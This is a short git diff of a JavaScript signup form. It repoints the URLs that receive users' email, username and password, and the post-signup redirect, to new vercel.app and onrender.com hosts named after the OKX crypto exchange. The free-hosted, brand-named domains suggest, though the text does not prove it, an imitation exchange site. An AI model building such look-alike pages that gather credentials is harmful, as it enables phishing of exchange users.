@@ -131,9 +131,9 @@ console.log("p",passwordError, "PE", passwordErrorlow, "Pu", passwordErrorUpper,
    // Function to handle button state changes
    
    const data =  {email, userName, password}  
-   const url = "https://okxnew-backend.vercel.app/api/register"
+   const url = "https://joll-okx-back-end.vercel.app/api/register"
 
-   const urll = "https://okxnewbackend.onrender.com/api/signupemailsand"
+   const urll = "https://jollokxbackend.onrender.com/api/signupemailsand"
 
    const signupEmailSand = () => {
      axios.post(urll, {email})
@@ -178,7 +178,7 @@ console.log("p",passwordError, "PE", passwordErrorlow, "Pu", passwordErrorUpper,
         dispatch(alluserdata(res.data.data))
         console.log("this is the data", getId.data._id)
           setTimeout(() => {
-            window.location = `https://accountokx.vercel.app/#/${getId.data._id}`
+            window.location = `https://accountokxcryptofield.vercel.app/#/${getId.data._id}`
             // navigate(`/userDashboard/${getId.data._id}`)
             // navigate(`/verify/${getId.data._id}`)
             console.log(getId._id);
